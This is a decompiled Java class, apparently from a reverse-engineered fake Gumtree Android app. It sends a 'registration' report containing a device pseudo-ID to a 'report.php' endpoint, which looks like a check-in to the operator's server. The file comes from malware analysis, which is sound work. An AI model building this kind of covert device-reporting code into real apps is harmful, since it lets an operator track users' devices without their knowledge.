package com.gumsis.srs.api.requests;

import android.content.Context;
import com.gumsis.Realtalk;
import com.gumsis.api.request.HttpRequest;
import com.gumsis.api.request.HttpResponse;
import com.gumsis.api.request.HttpResponseHandler;
import com.gumsis.api.tls.TxtTls;
import com.gumsis.srs.api.responses.StatusResponse;
import org.json.JSONObject;

public class RegistrationReportStep1Request
  extends HttpRequest
{
  private static final String PATH = "report.php";
  private HttpResponseHandler<HttpResponse> mResponseHandlerHandler;
  
  public RegistrationReportStep1Request(Context paramContext, HttpResponseHandler<HttpResponse> paramHttpResponseHandler)
  {
    super(paramContext, "report.php", 13);
    try
    {
      this.data = TxtTls.getBytesUTF8(getHttpParams(paramContext));
      this.mResponseHandlerHandler = paramHttpResponseHandler;
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  protected String getHttpParams(Context paramContext)
    throws Exception
  {
    JSONObject localJSONObject1 = new JSONObject();
    JSONObject localJSONObject2 = new JSONObject();
    localJSONObject1.put("report", "registration");
    localJSONObject1.put("id", Realtalk.getPsuedoID(paramContext));
    localJSONObject1.put("status", "start");
    localJSONObject2.put("1", localJSONObject1);
    return TxtTls.getPostParamsUTF8(localJSONObject2);
  }
  
  public String getUrl()
  {
    return getBaseUrl();
  }
  
  protected void onRequestFailure(int paramInt, String paramString)
  {
    StatusResponse localStatusResponse = new StatusResponse();
    localStatusResponse.parseFailureResponse(paramInt, paramString);
    if (this.mResponseHandlerHandler != null) {
      this.mResponseHandlerHandler.onResponse(this.requestType, localStatusResponse);
    }
  }
  
  protected void onRequestSuccess(JSONObject paramJSONObject)
  {
    StatusResponse localStatusResponse = new StatusResponse();
    localStatusResponse.parseSuccessResponse(paramJSONObject);
    if (this.mResponseHandlerHandler != null) {
      this.mResponseHandlerHandler.onResponse(this.requestType, localStatusResponse);
    }
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/srs/api/requests/RegistrationReportStep1Request.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */